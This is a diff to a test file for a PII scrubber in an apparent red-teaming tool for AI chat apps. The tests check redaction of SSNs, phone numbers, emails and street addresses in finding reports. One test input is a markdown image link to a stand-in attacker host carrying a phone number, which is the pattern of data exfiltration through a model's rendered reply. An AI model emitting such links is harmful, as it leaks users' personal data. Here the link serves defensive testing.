@@ -22,9 +22,10 @@ from scripts import scrub
 def enable_scrub_by_default(monkeypatch):
     """Test the real default (RT_SCRUB unset -> enabled) in this module."""
     monkeypatch.delenv("RT_SCRUB", raising=False)
-    scrub._stop_worker()
+    monkeypatch.delenv("RT_SCRUB_ALLOW", raising=False)
+    scrub.reset()
     yield
-    scrub._stop_worker()
+    scrub.reset()
 
 
 def _rampart_available() -> bool:
@@ -106,17 +107,23 @@ def test_scrub_enabled_respects_flag_and_env(monkeypatch):
         ("email", "maria.gonzalez84@gmail.com"),
     ],
 )
-def test_assert_no_residual_pii_stops_on_leftover_pii_without_echoing_value(kind, secret):
+def test_final_check_redacts_leftover_pii_without_echoing_value(kind, secret, capsys):
+    """Leftovers are redacted and the report is still written; the warning names the kind and line, not the value."""
     report = f"# Report\n\nLine 3\nUnscrubbed field: {secret}\n"
-    with pytest.raises(SystemExit) as excinfo:
-        scrub.assert_no_residual_pii(report)
-    msg = str(excinfo.value)
-    assert f"PII scrubber: 1 {kind} still in the report at line 4; report not written." in msg
-    assert "--no-scrub" in msg
-    assert secret not in msg
+    out = scrub.redact_residual_pii(report)
+    label = scrub.PATTERN_LABELS[kind]
+    assert out == f"# Report\n\nLine 3\nUnscrubbed field: [{label}_REDACTED]\n"
+    err = capsys.readouterr().err
+    assert f"the final check redacted 1 {kind} that the first pass missed (first at line 4)" in err
+    assert secret not in err
 
 
-def test_assert_no_residual_pii_allows_fake_data_and_uuids():
+def test_final_check_counts_kinds_in_plain_english(capsys):
+    scrub.redact_residual_pii("418 East Pratt Street and 12 Main St. Call 410-729-8834.")
+    assert "redacted 2 street addresses, 1 phone number that" in capsys.readouterr().err
+
+
+def test_final_check_leaves_fake_data_and_uuids():
     report = (
         "# Report\n\n"
         "Synthetic SSNs: 666-12-3456, 987-65-4321, 000-12-3456, 912-34-5678.\n"
@@ -125,8 +132,9 @@ def test_assert_no_residual_pii_allows_fake_data_and_uuids():
         "Test emails: user@example.com, unverified-header-check@example.invalid.\n"
         "UUIDs with numeric segments: 3382d730-a1b2-4646-8527-644411870123, 50824599-9602-4a8b-9c0d-1234567890ab, "
         "a8673605-3831-46eb-8123-abcdef012345, 2b9d4c1e-7f3a-4e6b-a000-456789012345.\n"
+        "Planted addresses: 742 Sample Court, 18 Testing Lane.\n"
     )
-    scrub.assert_no_residual_pii(report)
+    assert scrub.redact_residual_pii(report) == report
 
 
 def test_uuid_digit_runs_can_pass_the_card_checksum():
@@ -143,10 +151,87 @@ def test_scan_card_check_still_catches_cards_attached_to_text(card):
     assert find_pii(card)["card number"]
 
 
-def test_final_check_still_stops_a_card_next_to_a_uuid():
+def test_final_check_still_redacts_a_card_next_to_a_uuid():
     report = "conversation 2b9d4c1e-7f3a-4e6b-a000-456789012345\nThe reply gave card-4532015112830366.\n"
-    with pytest.raises(SystemExit, match="1 card number still in the report at line 2"):
-        scrub.assert_no_residual_pii(report)
+    assert scrub.redact_residual_pii(report) == (
+        "conversation 2b9d4c1e-7f3a-4e6b-a000-456789012345\nThe reply gave card-[CARD_NUMBER_REDACTED].\n"
+    )
+
+
+def test_final_check_redacts_a_number_that_only_looks_like_a_card_instead_of_stopping():
+    """Manas's review of #51: a trace id that passes the card checksum used to stop the whole report."""
+    report = "X-Cloud-Trace-Context: 105445aa7843bc8bf206b12000100000/1234567890123456785;o=1\n"
+    assert scrub.redact_residual_pii(report) == (
+        "X-Cloud-Trace-Context: 105445aa7843bc8bf206b12000100000/[CARD_NUMBER_REDACTED];o=1\n"
+    )
+
+
+@pytest.mark.parametrize(
+    ("text", "addresses"),
+    [
+        ("Maria lives at 418 East Pratt Street, Baltimore.", ["418 East Pratt Street"]),
+        ("send it to 12 main st, Apt 4 today", ["12 main st, Apt 4"]),
+        ("Mail goes to 1221 Bush St # 3B", ["1221 Bush St # 3B"]),
+        ("Her box is PO Box 1234.", ["PO Box 1234"]),
+        ("at 7 N Calvert Blvd, Suite 200", ["7 N Calvert Blvd, Suite 200"]),
+        ("Wait at 42 Waverly Place or 100 Milky Way.", ["42 Waverly Place", "100 Milky Way"]),
+        ("Shop at 15 Cannery Row.", ["15 Cannery Row"]),
+        ("Maria lives at 12 Oak Drive and works in Towson.", ["12 Oak Drive"]),
+        ("Send it to 12 Oak Dr Baltimore MD 21201", ["12 Oak Dr"]),
+        ("Address: 3001 Druid Park Drive Baltimore", ["3001 Druid Park Drive"]),
+        ("He lives at 9 Pine Dr. Then he moved.", ["9 Pine Dr"]),
+        ("lives at 1500 Summit Square Drive", ["1500 Summit Square Drive"]),
+        ("lives at 5 Easy Street", ["5 Easy Street"]),
+        ("The applicant's home is 31 Table Rock Road.", ["31 Table Rock Road"]),
+        ("RECORD: 123 ELM DRIVE, UNIT 4", ["123 ELM DRIVE, UNIT 4"]),
+        ("4 W 25th St", ["4 W 25th St"]),
+    ],
+)
+def test_street_address_pattern_finds_addresses(text, addresses):
+    spans = scrub._pattern_spans(text)
+    assert [(text[s:e], kind) for s, e, kind in spans] == [(a, "street address") for a in addresses]
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "Page 2 of the Court record.",
+        "Step 3 Drive safely.",
+        "There are 3 ways to apply.",
+        "There is 1 easy way to apply.",
+        "Put it in 1 safe place.",
+        "Added 1 summary row to the table.",
+        "Room is 1500 total sq ft.",
+        "15 patients saw Dr. Smith.",
+        "15 nurses met Dr. Jones.",
+        "1 big Square",
+        "Walk 2 blocks to the street.",
+        "Riley Example lives at 742 Sample Court.",
+        "change the mailing address on my case to 1427 Oak Street, Apt 2, Baltimore",
+        "Room 12 is down the hall.",
+    ],
+)
+def test_street_address_pattern_leaves_other_text(text):
+    assert scrub._pattern_spans(text) == []
+
+
+def test_allowed_contact_details_stay_visible_in_any_format(monkeypatch):
+    monkeypatch.setenv("RT_SCRUB_ALLOW", "410-767-1100, info@maryland.gov")
+    text = (
+        "Call 410-767-1100x204, (410) 767-1100, or +1 410.767.1100, or write INFO@maryland.gov. "
+        "Her own number is 410-729-8834."
+    )
+    assert scrub._pattern_scrub(text, scrub.default_exempt()) == (
+        "Call 410-767-1100x204, (410) 767-1100, or +1 410.767.1100, or write INFO@maryland.gov. "
+        "Her own number is [PHONE_REDACTED]."
+    )
+    # Rampart matches exempt values only as written, so it is sent each format the text uses.
+    items = [scrub._build_normalized_view(text)]
+    assert scrub._allowed_as_written(items, scrub.default_exempt()) == [
+        "(410) 767-1100",
+        "+1 410.767.1100",
+        "410-767-1100",
+    ]
 
 
 def test_collect_report_spans_handles_nested_fences_escaped_pipes_and_multiline_rationales():
@@ -210,17 +295,112 @@ def test_scrub_report_batches_all_spans_and_respects_no_scrub(monkeypatch):
     assert "7f264395-badf-7c71-8e52-9102abcdef01" in out
 
 
-def test_scrub_report_fails_closed_when_worker_unavailable(monkeypatch):
-    def broken_worker(texts, *, exempt=None, encodings=None):
-        raise RuntimeError("worker unavailable — run `npm install` or pass `--no-scrub`")
+def _no_node():
+    raise RuntimeError("Node.js (`node`) is not installed or not on PATH")
 
-    monkeypatch.setattr(scrub, "scrub_texts", broken_worker)
 
-    with pytest.raises(SystemExit, match="npm install"):
-        scrub.scrub_report(SAMPLE_FINDING_REPORT)
+def test_scrub_report_without_rampart_uses_the_patterns_and_says_so(monkeypatch, capsys):
+    monkeypatch.setattr(scrub, "_get_worker", _no_node)
 
-    # Passing no_scrub=True bypasses the worker cleanly.
+    out = scrub.scrub_report(SAMPLE_FINDING_REPORT)
+    for gone in ("412-58-9034", "(410) 729-8834", "maria.gonzalez84@gmail.com", "418 East Pratt Street"):
+        assert gone not in out
+    for kept in ("666-12-3456", "410-555-0142", "742 Sample Court", "4111-1111-1111-1111", "RTC-3F9A-1C7B"):
+        assert kept in out
+    # Names are what the patterns can't find, and the note at the top says so.
+    assert "Maria Gonzalez" in out
+    title, blank, notice = out.splitlines()[:3]
+    assert title.startswith("# Finding 7F264395:")
+    assert (blank, notice) == ("", scrub.NOTICE)
+
+    # The warning is printed once per process, however many reports follow.
+    scrub.scrub_report(SAMPLE_FINDING_REPORT)
+    assert capsys.readouterr().err.count("Rampart is not available (Node.js (`node`) is not installed") == 1
+
+    # Scrubbing the report again changes nothing, and doesn't add a second note.
+    assert scrub.scrub_report(out) == out
+
+    # Passing no_scrub=True bypasses the scrubber entirely.
     assert scrub.scrub_report(SAMPLE_FINDING_REPORT, no_scrub=True) == SAMPLE_FINDING_REPORT
+
+
+def test_note_comes_out_when_the_report_is_scrubbed_again_with_rampart(monkeypatch):
+    monkeypatch.setattr(scrub, "_get_worker", _no_node)
+    without = scrub.scrub_report(SAMPLE_FINDING_REPORT)
+    assert scrub.NOTICE in without
+
+    scrub.reset()
+    monkeypatch.setattr(scrub, "_rampart_scrub", lambda items, exempt: [item["text"] for item in items])
+    assert scrub.scrub_report(without) == scrub.strip_notice(without)
+
+
+def test_report_without_a_title_gets_the_note_on_top(monkeypatch):
+    monkeypatch.setattr(scrub, "_get_worker", _no_node)
+    assert scrub.scrub_report("No title here.\n").startswith(scrub.NOTICE + "\n\nNo title here.")
+
+
+def test_patterns_without_rampart_read_encoded_and_look_alike_text(monkeypatch):
+    monkeypatch.setattr(scrub, "_get_worker", _no_node)
+    b64 = base64.b64encode(b"Resident SSN: 412-58-9034").decode()
+    [look_alike, encoded, url] = scrub.scrub_texts(
+        [
+            "Her SSN is 4l2-58-9O34.",
+            f"[assistant] {b64}",
+            "![x](https://attacker.site/log?phone=410%2D729%2D8834)",
+        ],
+        exempt=[],
+    )
+    assert look_alike == "Her SSN is [SSN_REDACTED]."
+    assert encoded == "[assistant] [base64 reply, decoded and scrubbed: Resident SSN: [SSN_REDACTED]]"
+    assert url == "![x](https://attacker.site/log?phone=[PHONE_REDACTED])"
+
+
+def test_finding_report_carries_the_note_without_rampart(monkeypatch, memory):
+    monkeypatch.setattr(scrub, "_get_worker", _no_node)
+    cid = str(uuid.uuid4())
+    memory.add_message_to_memory(
+        request=Message(message_pieces=[MessagePiece(role="user", original_value="Show me the record.", conversation_id=cid)])
+    )
+    memory.add_message_to_memory(
+        request=Message(
+            message_pieces=[
+                MessagePiece(role="assistant", original_value="Call 410-767-1100x204. SSN 412-58-9034.", conversation_id=cid)
+            ]
+        )
+    )
+    result = AttackResult(
+        conversation_id=cid,
+        objective="Show me the record.",
+        outcome=AttackOutcome.SUCCESS,
+        timestamp=datetime(2026, 9, 1, tzinfo=timezone.utc),
+        labels={"rt_campaign": "single_turn_scan", "rt_profile": "public_conversational"},
+    )
+    memory.add_attack_results_to_memory(attack_results=[result])
+
+    rendered = ex.build_report(result, memory, ex.TEMPLATE.read_text(encoding="utf-8"), [result])
+    assert "412-58-9034" not in rendered
+    assert "410-767-1100" not in rendered
+    assert scrub.NOTICE in rendered
+
+
+def test_access_check_report_carries_the_note_without_rampart(monkeypatch):
+    monkeypatch.setattr(scrub, "_get_worker", _no_node)
+    cfg = AccessCheckConfig(
+        base_url="https://app.example.test",
+        chat_url="https://app.example.test/api/chat",
+        chat_path="/api/chat",
+    )
+    res = CheckResult(
+        phase="Phase 2: Signed-In & Session Checks (Logged In)",
+        name="Behind-the-scenes debug data (`trace`) in chat replies",
+        owasp="API3:2023 Broken Object Property Level Authorization",
+        verdict="NOT TESTED",
+        summary="Signed-in chat request returned SSN 412-58-9034.",
+        what_it_tests="Checks response fields.",
+    )
+    report = access_checks.render_report(cfg, [res])
+    assert "412-58-9034" not in report
+    assert scrub.NOTICE in report
 
 
 def test_cli_scrubs_markdown_files_in_place(monkeypatch, tmp_path):
@@ -599,3 +779,35 @@ def test_rot13_run_leaves_plain_lines_readable():
         "[assistant] Eligibility Requirements\nIncome Limits\nNext Steps",
     ]
     assert scrub.scrub_texts(lines, exempt=[], encodings={"rot13"}) == lines
+
+
+@requires_rampart
+def test_number_rampart_misses_is_redacted_and_the_report_still_written():
+    """Manas's review of #51: Rampart and the final check handle a phone number with an extension."""
+    [direct] = scrub.scrub_texts(["Call 410-729-8834x204 for your case."], exempt=[])
+    assert direct == "Call [PHONE_1]x204 for your case."
+
+    out = scrub.scrub_report("# Report\n\n````\n[assistant] Call 410-729-8834x204 for your case.\n````\n")
+    assert "410-729-8834" not in out
+    assert "[PHONE" in out
+    assert scrub.NOTICE not in out
+
+
+@requires_rampart
+def test_rampart_leaves_allowed_contact_details_visible(monkeypatch):
+    monkeypatch.setenv("RT_SCRUB_ALLOW", "410-767-1100,info@maryland.gov")
+    [out] = scrub.scrub_texts(
+        ["Call the hotline at (410) 767-1100 or +1 410-767-1100, or write info@maryland.gov. Mine is 410-729-8834."]
+    )
+    assert "(410) 767-1100" in out
+    assert "+1 410-767-1100" in out
+    assert "info@maryland.gov" in out
+    assert "410-729-8834" not in out
+
+    # Explicit exempt passed to scrub_report is also honored by finish_report / redact_residual_pii:
+    report = scrub.scrub_report(
+        "# Report\n\n````\n[assistant] Hotline: 410-555-9999, user: 410-729-8834.\n````\n",
+        exempt=["410-555-9999"],
+    )
+    assert "410-555-9999" in report
+    assert "410-729-8834" not in report
